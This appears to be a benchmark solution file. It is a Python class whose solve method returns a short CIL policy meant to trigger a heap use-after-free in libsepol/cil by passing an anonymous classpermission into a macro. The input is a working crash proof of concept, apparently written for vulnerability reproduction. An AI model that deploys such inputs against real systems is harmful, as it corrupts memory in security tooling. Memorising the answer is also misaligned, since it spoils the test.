import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in libsepol/cil.
        
        The vulnerability is triggered when an anonymous classpermission is passed as an argument
        to a macro, and that argument is used in a classpermissionset rule within the macro.
        This results in the anonymous classpermission being destroyed twice during AST destruction.
        """
        # Define a minimal CIL policy
        # 1. Declare a class 'c' and permission 'p'
        # 2. Define a macro 'm' taking a classpermission 'arg'
        # 3. Inside macro, use 'arg' in a classpermissionset statement
        # 4. Call macro 'm' with an anonymous classpermission '(c (p))'
        cil_poc = (
            "(class c (p))\n"
            "(classorder (c))\n"
            "(macro m ((classpermission arg))\n"
            "    (classpermissionset arg (c (p)))\n"
            ")\n"
            "(call m ((c (p))))\n"
        )
        
        return cil_poc.encode('utf-8')